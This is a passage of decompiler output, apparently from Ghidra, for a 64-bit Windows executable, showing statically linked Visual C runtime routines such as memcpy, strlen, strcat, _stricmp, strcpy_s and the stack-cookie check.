            puVar2[1] = param_2;
            puVar2[2] = param_2;
            param_1 = puVar2 + 8;
            puVar2[3] = param_2;
            puVar2[4] = param_2;
            uVar3 = uVar3 - 1;
            puVar2[5] = param_2;
            puVar2[6] = param_2;
            puVar2[7] = param_2;
            puVar2 = param_1;
          } while (uVar3 != 0);
        }
        else {
          do {
            *puVar2 = param_2;
            puVar2[1] = param_2;
            puVar2[2] = param_2;
            param_1 = puVar2 + 8;
            puVar2[3] = param_2;
            puVar2[4] = param_2;
            uVar3 = uVar3 - 1;
            puVar2[5] = param_2;
            puVar2[6] = param_2;
            puVar2[7] = param_2;
            puVar2 = param_1;
          } while (uVar3 != 0);
          LOCK();
          UNLOCK();
        }
      }
    }
    uVar3 = param_3 & 7;
    for (uVar4 = param_3 >> 3; uVar4 != 0; uVar4 = uVar4 - 1) {
      *param_1 = param_2;
      param_1 = param_1 + 1;
    }
  }
  for (; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(char *)param_1 = (char)param_2;
    param_1 = (ulonglong *)((longlong)param_1 + 1);
  }
  return;
}




/* Library Function - Single Match
    __security_check_cookie
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2010 Debug, Visual
   Studio 2010 Release */

void __cdecl __security_check_cookie(uintptr_t _StackCookie)

{
  if ((_StackCookie == DAT_14001a0b0) && ((short)(_StackCookie >> 0x30) == 0)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __report_gsfailure(_StackCookie);
}




undefined4 FUN_140006190(byte *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined4 uVar1;
  DWORD *pDVar2;
  undefined **ppuVar3;
  undefined8 uVar4;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  if (param_1 == (byte *)0x0) {
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    uVar1 = 0xffffffff;
  }
  else {
    ppuVar3 = FUN_140008850();
    FUN_140008a00(1,(longlong)(ppuVar3 + 6));
    ppuVar3 = FUN_140008850();
    uVar4 = FUN_140008ab0(ppuVar3 + 6);
    ppuVar3 = FUN_140008850();
    uVar1 = FUN_140008bd0((FILE *)(ppuVar3 + 6),param_1,(longlong *)0x0,(WCHAR *)&local_res10);
    ppuVar3 = FUN_140008850();
    _ftbuf((int)uVar4,(FILE *)(ppuVar3 + 6));
    ppuVar3 = FUN_140008850();
    FUN_140008a90(1,(longlong)(ppuVar3 + 6));
  }
  return uVar1;
}




void FUN_140006250(void)

{
  undefined **ppuVar1;
  
  ppuVar1 = FUN_140008850();
  FUN_140008a90(1,(longlong)(ppuVar1 + 6));
  return;
}




bool FUN_140006280(void)

{
  return DAT_14001b600 == (DAT_14001a0b0 | 1);
}




ulonglong FUN_1400062a0(char *param_1,byte *param_2,undefined8 param_3,undefined8 param_4)

{
  DWORD *pDVar1;
  ulonglong uVar2;
  undefined8 local_res18;
  undefined8 local_res20;
  FILE local_38;
  
  local_res18 = param_3;
  local_res20 = param_4;
  if ((param_2 != (byte *)0x0) && (param_1 != (char *)0x0)) {
    local_38._cnt = 0x7fffffff;
    local_38._flag = 0x42;
    local_38._ptr = param_1;
    local_38._base = param_1;
    uVar2 = FUN_140008bd0(&local_38,param_2,(longlong *)0x0,(WCHAR *)&local_res18);
    local_38._cnt = local_38._cnt + -1;
    if (-1 < local_38._cnt) {
      *local_38._ptr = '\0';
      return uVar2;
    }
    FUN_140009cf0(0,&local_38);
    return uVar2 & 0xffffffff;
  }
  pDVar1 = FUN_140009c00();
  *pDVar1 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0xffffffff;
}




void FUN_140006350(char *param_1,ulonglong param_2,longlong param_3,undefined8 param_4)

{
  undefined8 local_res20;
  
  local_res20 = param_4;
  FUN_140009fd0(param_1,param_2,param_3,0,&local_res20);
  return;
}




/* Library Function - Single Match
    strcat
   
   Library: Visual Studio */

char * __cdecl strcat(char *_Dest,char *_Source)

{
  ulonglong uVar1;
  char cVar2;
  ulonglong *puVar3;
  ulonglong *puVar4;
  ulonglong *puVar5;
  longlong lVar6;
  
  uVar1 = (ulonglong)_Dest & 7;
  puVar3 = (ulonglong *)_Dest;
  while (uVar1 != 0) {
    puVar5 = puVar3;
    if ((char)*puVar3 == '\0') goto LAB_140006433;
    puVar3 = (ulonglong *)((longlong)puVar3 + 1);
    uVar1 = (ulonglong)puVar3 & 7;
  }
  do {
    do {
      puVar4 = puVar3;
      uVar1 = *puVar4;
      puVar3 = puVar4 + 1;
    } while (((uVar1 ^ 0xffffffffffffffff ^ uVar1 + 0x7efefefefefefeff) & 0x8101010101010100) == 0);
    puVar5 = puVar4;
  } while ((((((char)uVar1 != '\0') &&
             (puVar5 = (ulonglong *)((longlong)puVar4 + 1), (char)(uVar1 >> 8) != '\0')) &&
            (puVar5 = (ulonglong *)((longlong)puVar4 + 2), (char)(uVar1 >> 0x10) != '\0')) &&
           ((puVar5 = (ulonglong *)((longlong)puVar4 + 3), (char)(uVar1 >> 0x18) != '\0' &&
            (puVar5 = (ulonglong *)((longlong)puVar4 + 4), (char)(uVar1 >> 0x20) != '\0')))) &&
          ((puVar5 = (ulonglong *)((longlong)puVar4 + 5), (char)(uVar1 >> 0x28) != '\0' &&
           ((puVar5 = (ulonglong *)((longlong)puVar4 + 6), (char)(uVar1 >> 0x30) != '\0' &&
            (puVar5 = (ulonglong *)((longlong)puVar4 + 7), (char)(uVar1 >> 0x38) != '\0'))))));
LAB_140006433:
  lVar6 = (longlong)puVar5 - (longlong)_Source;
  uVar1 = (ulonglong)_Source & 7;
  while( true ) {
    if (uVar1 == 0) {
      while( true ) {
        while (uVar1 = *(ulonglong *)_Source,
              ((uVar1 ^ 0xffffffffffffffff ^ uVar1 + 0x7efefefefefefeff) & 0x8101010101010100) == 0)
        {
          *(ulonglong *)(lVar6 + (longlong)_Source) = uVar1;
          _Source = (char *)((longlong)_Source + 8);
        }
        *(char *)(lVar6 + (longlong)_Source) = (char)uVar1;
        if (((((char)uVar1 == '\0') ||
             (cVar2 = (char)(uVar1 >> 8), *(char *)((longlong)_Source + lVar6 + 1) = cVar2,
             cVar2 == '\0')) ||
            (cVar2 = (char)(uVar1 >> 0x10), *(char *)((longlong)_Source + lVar6 + 2) = cVar2,
            cVar2 == '\0')) ||
           (((cVar2 = (char)(uVar1 >> 0x18), *(char *)((longlong)_Source + lVar6 + 3) = cVar2,
             cVar2 == '\0' ||
             (cVar2 = (char)(uVar1 >> 0x20), *(char *)((longlong)_Source + lVar6 + 4) = cVar2,
             cVar2 == '\0')) ||
            ((cVar2 = (char)(uVar1 >> 0x28), *(char *)((longlong)_Source + lVar6 + 5) = cVar2,
             cVar2 == '\0' ||
             ((cVar2 = (char)(uVar1 >> 0x30), *(char *)((longlong)_Source + lVar6 + 6) = cVar2,
              cVar2 == '\0' ||
              (cVar2 = (char)(uVar1 >> 0x38), *(char *)((longlong)_Source + lVar6 + 7) = cVar2,
              cVar2 == '\0')))))))) break;
        _Source = (char *)((longlong)_Source + 8);
      }
      return _Dest;
    }
    uVar1 = *(ulonglong *)_Source;
    *(char *)(lVar6 + (longlong)_Source) = (char)uVar1;
    if ((char)uVar1 == '\0') break;
    _Source = (char *)((longlong)_Source + 1);
    uVar1 = (ulonglong)_Source & 7;
  }
  return _Dest;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_1400064f0(byte *param_1,byte *param_2,undefined8 *param_3)

{
  byte bVar1;
  DWORD *pDVar2;
  uint uVar3;
  uint uVar4;
  pthreadlocinfo local_28;
  pthreadmbcinfo local_20;
  DWORD *local_18;
  char local_10;
  
  local_10 = '\0';
  if (param_3 == (undefined8 *)0x0) {
    local_18 = FUN_14000b3d0();
    local_28 = *(pthreadlocinfo *)(local_18 + 0x30);
    local_20 = *(pthreadmbcinfo *)(local_18 + 0x2e);
    if ((local_28 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_28 = __updatetlocinfo();
    }
    if ((local_20 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_20 = __updatetmbcinfo();
    }
    if ((local_18[0x32] & 2) == 0) {
      local_18[0x32] = local_18[0x32] | 2;
      local_10 = '\x01';
    }
  }
  else {
    local_28 = (pthreadlocinfo)*param_3;
    local_20 = (pthreadmbcinfo)param_3[1];
  }
  if ((param_1 == (byte *)0x0) || (param_2 == (byte *)0x0)) {
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
    }
    return 0x7fffffff;
  }
  if (*(int *)((longlong)&local_28->lc_category[0].locale + 4) == 0) {
    do {
      bVar1 = *param_1;
      uVar3 = (uint)bVar1;
      param_1 = param_1 + 1;
      if (bVar1 - 0x41 < 0x1a) {
        uVar3 = bVar1 + 0x20;
      }
      bVar1 = *param_2;
      uVar4 = (uint)bVar1;
      param_2 = param_2 + 1;
      if (bVar1 - 0x41 < 0x1a) {
        uVar4 = bVar1 + 0x20;
      }
    } while ((uVar3 != 0) && (uVar3 == uVar4));
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
    }
    return uVar3 - uVar4;
  }
  do {
    uVar3 = FUN_14000b700((uint)*param_1,&local_28);
    param_1 = param_1 + 1;
    uVar4 = FUN_14000b700((uint)*param_2,&local_28);
    param_2 = param_2 + 1;
    if (uVar3 == 0) break;
  } while (uVar3 == uVar4);
  if (local_10 != '\0') {
    local_18[0x32] = local_18[0x32] & 0xfffffffd;
  }
  return uVar3 - uVar4;
}




/* Library Function - Single Match
    _stricmp
   
   Library: Visual Studio 2005 Release */

int __cdecl _stricmp(char *_Str1,char *_Str2)

{
  byte bVar1;
  int iVar2;
  DWORD *pDVar3;
  uint uVar4;
  uint uVar5;
  
  if (DAT_14001bbf8 != 0) {
    iVar2 = FUN_1400064f0((byte *)_Str1,(byte *)_Str2,(undefined8 *)0x0);
    return iVar2;
  }
  if ((_Str1 != (char *)0x0) && (_Str2 != (char *)0x0)) {
    do {
      bVar1 = *_Str1;
      uVar4 = (uint)bVar1;
      _Str1 = (char *)((byte *)_Str1 + 1);
      if (bVar1 - 0x41 < 0x1a) {
        uVar4 = bVar1 + 0x20;
      }
      bVar1 = *_Str2;
      uVar5 = (uint)bVar1;
      _Str2 = (char *)((byte *)_Str2 + 1);
      if (bVar1 - 0x41 < 0x1a) {
        uVar5 = bVar1 + 0x20;
      }
    } while ((uVar4 != 0) && (uVar4 == uVar5));
    return uVar4 - uVar5;
  }
  pDVar3 = FUN_140009c00();
  *pDVar3 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x7fffffff;
}




/* Library Function - Single Match
    strlen
   
   Library: Visual Studio */

size_t __cdecl strlen(char *_Str)

{
  ulonglong uVar1;
  ulonglong *puVar2;
  longlong lVar3;
  
  lVar3 = -(longlong)_Str;
  uVar1 = (ulonglong)_Str & 7;
  while (uVar1 != 0) {
    uVar1 = *(ulonglong *)_Str;
    _Str = (char *)((longlong)_Str + 1);
    if ((char)uVar1 == '\0') goto LAB_1400067f8;
    uVar1 = (ulonglong)_Str & 7;
  }
  do {
    do {
      puVar2 = (ulonglong *)_Str;
      _Str = (char *)(puVar2 + 1);
    } while (((~*puVar2 ^ *puVar2 + 0x7efefefefefefeff) & 0x8101010101010100) == 0);
    uVar1 = *puVar2;
    if ((char)uVar1 == '\0') {
      return (size_t)(char *)(lVar3 + -8 + (longlong)_Str);
    }
    if ((char)(uVar1 >> 8) == '\0') {
      return (size_t)(char *)(lVar3 + -7 + (longlong)_Str);
    }
    if ((char)(uVar1 >> 0x10) == '\0') {
      return (size_t)(char *)(lVar3 + -6 + (longlong)_Str);
    }
    if ((char)(uVar1 >> 0x18) == '\0') {
      return (size_t)(char *)(lVar3 + -5 + (longlong)_Str);
    }
    if ((char)(uVar1 >> 0x20) == '\0') {
      return (size_t)(char *)(lVar3 + -4 + (longlong)_Str);
    }
    if ((char)(uVar1 >> 0x28) == '\0') {
      return (size_t)(char *)(lVar3 + -3 + (longlong)_Str);
    }
    if ((char)(uVar1 >> 0x30) == '\0') {
      return (size_t)(char *)(lVar3 + -2 + (longlong)_Str);
    }
  } while ((char)(uVar1 >> 0x38) != '\0');
LAB_1400067f8:
  return (size_t)(char *)(lVar3 + -1 + (longlong)_Str);
}




/* Library Function - Single Match
    memcpy
   
   Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010 */

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined8 uVar1;
  int iVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  
  uVar5 = (longlong)_Src - (longlong)_Dst;
  if (_Src < _Dst) {
    puVar4 = (undefined8 *)((longlong)_Dst + _Size);
    puVar3 = puVar4;
    if (_Size < 8) goto LAB_140006a54;
    if (((ulonglong)puVar4 & 7) != 0) {
      if (((ulonglong)puVar4 & 1) != 0) {
        puVar4 = (undefined8 *)((longlong)puVar4 + -1);
        _Size = _Size - 1;
        *(undefined1 *)puVar4 = *(undefined1 *)(uVar5 + (longlong)puVar4);
      }
      if (((ulonglong)puVar4 & 2) != 0) {
        puVar4 = (undefined8 *)((longlong)puVar4 + -2);
        _Size = _Size - 2;
        *(undefined2 *)puVar4 = *(undefined2 *)(uVar5 + (longlong)puVar4);
      }
      if (((ulonglong)puVar4 & 4) != 0) {
        puVar4 = (undefined8 *)((longlong)puVar4 + -4);
        _Size = _Size - 4;
        *(undefined4 *)puVar4 = *(undefined4 *)(uVar5 + (longlong)puVar4);
      }
    }
    while (uVar6 = _Size >> 5, puVar3 = puVar4, uVar6 != 0) {
      if ((uVar6 < 0x2000) || (0xfffffffffffff000 < uVar5)) goto LAB_140006a90;
      do {
        iVar2 = 0x20;
        do {
          puVar3 = puVar4;
          iVar2 = iVar2 + -1;
          puVar4 = puVar3 + -0x10;
        } while (iVar2 != 0);
        iVar2 = 0x40;
        puVar3 = puVar3 + 0x1f0;
        do {
          uVar1 = *(undefined8 *)((uVar5 - 0x10) + (longlong)puVar3);
          puVar3[-1] = *(undefined8 *)((uVar5 - 8) + (longlong)puVar3);
          puVar3[-2] = uVar1;
          uVar1 = *(undefined8 *)((uVar5 - 0x20) + (longlong)puVar3);
          puVar3[-3] = *(undefined8 *)((uVar5 - 0x18) + (longlong)puVar3);
          puVar3[-4] = uVar1;
          uVar1 = *(undefined8 *)((uVar5 - 0x30) + (longlong)puVar3);
          puVar4 = puVar3 + -8;
          puVar3[-5] = *(undefined8 *)((uVar5 - 0x28) + (longlong)puVar3);
          puVar3[-6] = uVar1;
          uVar1 = *(undefined8 *)(uVar5 + (longlong)puVar4);
          iVar2 = iVar2 + -1;
          puVar3[-7] = *(undefined8 *)(uVar5 + 8 + (longlong)puVar4);
          *puVar4 = uVar1;
          puVar3 = puVar4;
        } while (iVar2 != 0);
        _Size = _Size - 0x1000;
      } while (0xfff < _Size);
      LOCK();
      UNLOCK();
    }
    goto LAB_140006a37;
  }
  puVar4 = (undefined8 *)_Dst;
  if (_Size < 8) goto LAB_1400068b3;
  puVar3 = (undefined8 *)_Dst;
  if (((ulonglong)_Dst & 7) != 0) {
    if (((ulonglong)_Dst & 1) != 0) {
      _Size = _Size - 1;
      *(undefined1 *)_Dst = *(undefined1 *)(uVar5 + (longlong)_Dst);
      puVar3 = (undefined8 *)((longlong)_Dst + 1);
    }
    if (((ulonglong)puVar3 & 2) != 0) {
      _Size = _Size - 2;
      *(undefined2 *)puVar3 = *(undefined2 *)(uVar5 + (longlong)puVar3);
      puVar3 = (undefined8 *)((longlong)puVar3 + 2);
    }
    if (((ulonglong)puVar3 & 4) != 0) {
      _Size = _Size - 4;
      *(undefined4 *)puVar3 = *(undefined4 *)(uVar5 + (longlong)puVar3);
      puVar3 = (undefined8 *)((longlong)puVar3 + 4);
    }
  }
  while (uVar6 = _Size >> 5, puVar4 = puVar3, uVar6 != 0) {
    if ((uVar6 < 0x2000) || (uVar5 < 0x1000)) goto LAB_1400068f0;
    do {
      iVar2 = 0x20;
      do {
        puVar4 = puVar3;
        iVar2 = iVar2 + -1;
        puVar3 = puVar4 + 0x10;
      } while (iVar2 != 0);
      iVar2 = 0x40;
      puVar4 = puVar4 + -0x1f0;
      do {
        uVar1 = *(undefined8 *)(uVar5 + 8 + (longlong)puVar4);
        *puVar4 = *(undefined8 *)(uVar5 + (longlong)puVar4);
        puVar4[1] = uVar1;
        uVar1 = *(undefined8 *)(uVar5 + 0x18 + (longlong)puVar4);
        puVar4[2] = *(undefined8 *)(uVar5 + 0x10 + (longlong)puVar4);
        puVar4[3] = uVar1;
        uVar1 = *(undefined8 *)(uVar5 + 0x28 + (longlong)puVar4);
        puVar3 = puVar4 + 8;
        puVar4[4] = *(undefined8 *)(uVar5 + 0x20 + (longlong)puVar4);
        puVar4[5] = uVar1;
        uVar1 = *(undefined8 *)((uVar5 - 8) + (longlong)puVar3);
        iVar2 = iVar2 + -1;
        puVar4[6] = *(undefined8 *)((uVar5 - 0x10) + (longlong)puVar3);
        puVar4[7] = uVar1;
        puVar4 = puVar3;
      } while (iVar2 != 0);
      _Size = _Size - 0x1000;
    } while (0xfff < _Size);
    LOCK();
    UNLOCK();
  }
  goto LAB_140006896;
LAB_140006a90:
  do {
    uVar1 = *(undefined8 *)((uVar5 - 0x10) + (longlong)puVar4);
    puVar3 = puVar4 + -4;
    puVar4[-1] = *(undefined8 *)((uVar5 - 8) + (longlong)puVar4);
    puVar4[-2] = uVar1;
    uVar1 = *(undefined8 *)(uVar5 + (longlong)puVar3);
    uVar6 = uVar6 - 1;
    puVar4[-3] = *(undefined8 *)(uVar5 + 8 + (longlong)puVar3);
    *puVar3 = uVar1;
    puVar4 = puVar3;
  } while (uVar6 != 0);
  _Size = _Size & 0x1f;
LAB_140006a37:
  uVar6 = _Size >> 3;
  if (uVar6 != 0) {
    do {
      puVar3 = puVar3 + -1;
      uVar6 = uVar6 - 1;
      *puVar3 = *(undefined8 *)(uVar5 + (longlong)puVar3);
    } while (uVar6 != 0);
    _Size = _Size & 7;
  }
LAB_140006a54:
  if (_Size == 0) {
    return _Dst;
  }
  do {
    puVar3 = (undefined8 *)((longlong)puVar3 + -1);
    _Size = _Size - 1;
    *(undefined1 *)puVar3 = *(undefined1 *)(uVar5 + (longlong)puVar3);
  } while (_Size != 0);
  return _Dst;
LAB_1400068f0:
  do {
    uVar1 = *(undefined8 *)(uVar5 + 8 + (longlong)puVar3);
    puVar4 = puVar3 + 4;
    *puVar3 = *(undefined8 *)(uVar5 + (longlong)puVar3);
    puVar3[1] = uVar1;
    uVar1 = *(undefined8 *)((uVar5 - 8) + (longlong)puVar4);
    uVar6 = uVar6 - 1;
    puVar3[2] = *(undefined8 *)((uVar5 - 0x10) + (longlong)puVar4);
    puVar3[3] = uVar1;
    puVar3 = puVar4;
  } while (uVar6 != 0);
  _Size = _Size & 0x1f;
LAB_140006896:
  uVar6 = _Size >> 3;
  if (uVar6 != 0) {
    do {
      *puVar4 = *(undefined8 *)(uVar5 + (longlong)puVar4);
      puVar4 = puVar4 + 1;
      uVar6 = uVar6 - 1;
    } while (uVar6 != 0);
    _Size = _Size & 7;
  }
LAB_1400068b3:
  if (_Size == 0) {
    return _Dst;
  }
  do {
    *(undefined1 *)puVar4 = *(undefined1 *)(uVar5 + (longlong)puVar4);
    puVar4 = (undefined8 *)((longlong)puVar4 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}




/* Library Function - Single Match
    strcpy_s
   
   Library: Visual Studio 2005 Release */

errno_t __cdecl strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  DWORD *pDVar2;
  char *pcVar3;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        _Src = _Src + 1;
        *pcVar3 = cVar1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes == 0) {
        *_Dst = '\0';
        pDVar2 = FUN_140009c00();
        *pDVar2 = 0x22;
        FUN_1400072d0(0,0,0,0,0);
        return 0x22;
      }
      return 0;
    }
    *_Dst = '\0';
  }
  pDVar2 = FUN_140009c00();
  *pDVar2 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x16;
}




/* Library Function - Single Match
    strcat_s
   
   Library: Visual Studio 2005 Release */

errno_t __cdecl strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  DWORD *pDVar2;
  char *pcVar3;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src == (char *)0x0) {
      *_Dst = '\0';
    }
    else {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          _Src = _Src + 1;
          *pcVar3 = cVar1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
          pcVar3 = pcVar3 + 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes == 0) {
          *_Dst = '\0';
          pDVar2 = FUN_140009c00();
          *pDVar2 = 0x22;
          FUN_1400072d0(0,0,0,0,0);
          return 0x22;
        }
        return 0;
      }
      *_Dst = '\0';
    }
  }
  pDVar2 = FUN_140009c00();
  *pDVar2 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x16;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_140006d10(byte *param_1,byte *param_2,longlong *param_3)

{
  int iVar1;
  DWORD *pDVar2;
  ulonglong uVar3;
  ushort uVar4;
  ulonglong uVar5;
  byte *pbVar6;
  byte *pbVar7;
  pthreadmbcinfo ptVar8;
  byte local_res8;
  byte local_res9;
  pthreadlocinfo local_28;
  pthreadmbcinfo local_20;
  DWORD *local_18;
  char local_10;
  
  local_10 = '\0';
  if (param_3 == (longlong *)0x0) {
    local_18 = FUN_14000b3d0();
    local_28 = *(pthreadlocinfo *)(local_18 + 0x30);
    local_20 = *(pthreadmbcinfo *)(local_18 + 0x2e);
    if ((local_28 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_28 = __updatetlocinfo();
    }
    if ((local_20 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_20 = __updatetmbcinfo();
    }
    if ((local_18[0x32] & 2) == 0) {
      local_18[0x32] = local_18[0x32] | 2;
      local_10 = '\x01';
    }
  }
  else {
    local_28 = (pthreadlocinfo)*param_3;
    local_20 = (pthreadmbcinfo)param_3[1];
  }
  if ((param_1 == (byte *)0x0) || (param_2 == (byte *)0x0)) {
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
    }
    return 0x7fffffff;
  }
  ptVar8 = local_20;
  if (local_20->ismbcodepage == 0) {
    iVar1 = FUN_1400064f0(param_1,param_2,&local_28);
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
      return iVar1;
    }
  }
  else {
    do {
      uVar5 = (ulonglong)*param_1;
      pbVar7 = param_1 + 1;
      if ((ptVar8->mbctype[uVar5 + 5] & 4) == 0) {
        if ((ptVar8->mbctype[uVar5 + 5] & 0x10) != 0) {
          uVar5 = (ulonglong)ptVar8->mbcasemap[uVar5 + 4];
        }
      }
      else if (*pbVar7 == 0) {
        uVar5 = 0;
      }
      else {
        iVar1 = FUN_14000bf50((longlong *)&local_28,*(LCID *)ptVar8->mbulinfo,0x200,(LPCSTR)param_1,
                              2,(LPSTR)&local_res8,2,ptVar8->mbcodepage,1);
        ptVar8 = local_20;
        if (iVar1 == 1) {
          uVar5 = (ulonglong)local_res8;
          pbVar7 = param_1 + 2;
        }
        else {
          if (iVar1 != 2) goto LAB_14000700a;
          uVar5 = (ulonglong)(ushort)((ushort)local_res8 * 0x100 + (ushort)local_res9);
          pbVar7 = param_1 + 2;
        }
      }
      uVar3 = (ulonglong)*param_2;
      pbVar6 = param_2 + 1;
      if ((ptVar8->mbctype[uVar3 + 5] & 4) == 0) {
        if ((ptVar8->mbctype[uVar3 + 5] & 0x10) != 0) {
          uVar3 = (ulonglong)ptVar8->mbcasemap[uVar3 + 4];
        }
      }
      else if (*pbVar6 == 0) {
        uVar3 = 0;
      }
      else {
        iVar1 = FUN_14000bf50((longlong *)&local_28,*(LCID *)ptVar8->mbulinfo,0x200,(LPCSTR)param_2,
                              2,(LPSTR)&local_res8,2,ptVar8->mbcodepage,1);
        ptVar8 = local_20;
        if (iVar1 == 1) {
          uVar3 = (ulonglong)local_res8;
          pbVar6 = param_2 + 2;
        }
        else {
          if (iVar1 != 2) {
LAB_14000700a:
            pDVar2 = FUN_140009c00();
            *pDVar2 = 0x16;
            if (local_10 != '\0') {
              local_18[0x32] = local_18[0x32] & 0xfffffffd;
            }
            return 0x7fffffff;
          }
          uVar3 = (ulonglong)(ushort)((ushort)local_res8 * 0x100 + (ushort)local_res9);
          pbVar6 = param_2 + 2;
        }
      }
      uVar4 = (ushort)uVar5;
      if (uVar4 != (ushort)uVar3) {
        iVar1 = -1;
        if ((ushort)uVar3 < uVar4) {
          iVar1 = 1;
        }
        if (local_10 == '\0') {
          return iVar1;
        }
        local_18[0x32] = local_18[0x32] & 0xfffffffd;
        return iVar1;
      }
      param_2 = pbVar6;
      param_1 = pbVar7;
    } while (uVar4 != 0);
    if (local_10 != (char)uVar5) {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
    }
    iVar1 = 0;
  }
  return iVar1;
}




void FUN_140007070(byte *param_1,byte *param_2)

{
  FUN_140006d10(param_1,param_2,(longlong *)0x0);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

byte * FUN_140007080(byte *param_1,uint param_2,longlong param_3)

{
  byte bVar1;
  ushort uVar2;
  bool bVar3;
  pthreadmbcinfo ptVar4;
  byte *pbVar5;
  DWORD *pDVar6;
  byte bVar7;
  byte *pbVar8;
  DWORD *local_28;
  
  bVar3 = false;
  pbVar5 = (byte *)0x0;
  if (param_3 == 0) {
    local_28 = FUN_14000b3d0();
    ptVar4 = *(pthreadmbcinfo *)(local_28 + 0x2e);
    if ((*(undefined **)(local_28 + 0x30) != PTR_DAT_14001ad00) &&
       ((_DAT_14001ab88 & local_28[0x32]) == 0)) {
      __updatetlocinfo();
    }
    if ((ptVar4 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_28[0x32]) == 0)) {
      ptVar4 = __updatetmbcinfo();
    }
    if ((local_28[0x32] & 2) == 0) {
      bVar3 = true;
      local_28[0x32] = local_28[0x32] | 2;
    }
  }
  else {
    ptVar4 = *(pthreadmbcinfo *)(param_3 + 8);
    bVar3 = false;
  }
  if (ptVar4->ismbcodepage == 0) {
    pbVar5 = (byte *)strrchr((char *)param_1,param_2);
    if (bVar3) {
      local_28[0x32] = local_28[0x32] & 0xfffffffd;
    }
  }
  else if (param_1 == (byte *)0x0) {
    pDVar6 = FUN_140009c00();
    *pDVar6 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    if (bVar3) {
      local_28[0x32] = local_28[0x32] & 0xfffffffd;
    }
    pbVar5 = (byte *)0x0;
  }
  else {
    do {
      bVar7 = *param_1;
      if ((ptVar4->mbctype[(ulonglong)bVar7 + 5] & 4) == 0) {
        pbVar8 = param_1;
        if (param_2 == bVar7) {
          pbVar5 = param_1;
        }
      }
      else {
        bVar1 = param_1[1];
        pbVar8 = param_1 + 1;
        if (bVar1 == 0) {
          bVar7 = bVar1;
          if (pbVar5 == (byte *)0x0) {
            pbVar5 = pbVar8;
          }
        }
        else {
          uVar2 = CONCAT11(bVar7,bVar1);
          bVar7 = bVar1;
          if (param_2 == uVar2) {
            pbVar5 = param_1;
          }
        }
      }
      param_1 = pbVar8 + 1;
    } while (bVar7 != 0);
    if (bVar3) {
      local_28[0x32] = local_28[0x32] & 0xfffffffd;
    }
  }
  return pbVar5;
}




void FUN_140007210(byte *param_1,uint param_2)

{
  FUN_140007080(param_1,param_2,0);
  return;
}




void FUN_140007220(undefined8 param_1)

{
  DAT_14001b610 = param_1;
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    void __cdecl _invoke_watson(unsigned short const * __ptr64,unsigned short const *
   __ptr64,unsigned short const * __ptr64,unsigned int,unsigned __int64)
    _invoke_watson
   
   Library: Visual Studio 2005 Release */

void __cdecl
FID_conflict__invoke_watson
          (wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  BOOL BVar1;
  LONG LVar2;
  HANDLE hProcess;
  _EXCEPTION_POINTERS local_588;
  EXCEPTION_RECORD local_578;
  _CONTEXT local_4d8;
  
  RtlCaptureContext(&local_4d8);
  FUN_140006070((ulonglong *)&local_578,0,0x98);
  local_578.ExceptionCode = 0xc000000d;
  local_588.ExceptionRecord = &local_578;
  local_588.ContextRecord = &local_4d8;
  BVar1 = IsDebuggerPresent();
